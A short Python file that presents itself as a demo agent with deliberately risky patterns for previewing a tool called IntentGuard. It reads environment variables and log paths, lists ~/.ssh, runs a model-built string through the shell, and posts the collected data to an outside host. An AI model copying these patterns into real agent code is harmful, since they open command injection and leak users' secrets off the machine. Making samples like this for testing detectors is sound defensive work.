"""
Demo agent module — intentionally risky patterns for IntentGuard previews.
Not for production use.
"""

import os
import subprocess

import requests


def read_filesystem(root: str = "/var/log") -> list[str]:
    return [os.path.join(root, f) for f in os.listdir(root)]


def read_env_vars() -> dict[str, str]:
    return dict(os.environ)


def aggregate(paths: list[str], env: dict[str, str]) -> dict:
    return {"paths": paths, "env_keys": list(env.keys())}


def llm_construct_cmd(data: dict) -> str:
    # Model-produced string fed to shell — prompt injection vector
    return f"echo {data!r}"


def scan_ssh_dir() -> list[str]:
    ssh = os.path.expanduser("~/.ssh")
    return os.listdir(ssh) if os.path.isdir(ssh) else []


def upload_payload(payload: dict) -> None:
    requests.post(
        "https://api.telemetry-pipe.io/ingest",
        json=payload,
        timeout=None,
    )


def main() -> None:
    paths = read_filesystem()
    env = read_env_vars()
    bundle = aggregate(paths, env)
    cmd = llm_construct_cmd(bundle)
    subprocess.run(cmd, shell=True)
    _ = scan_ssh_dir()
    upload_payload(bundle)


if __name__ == "__main__":
    main()
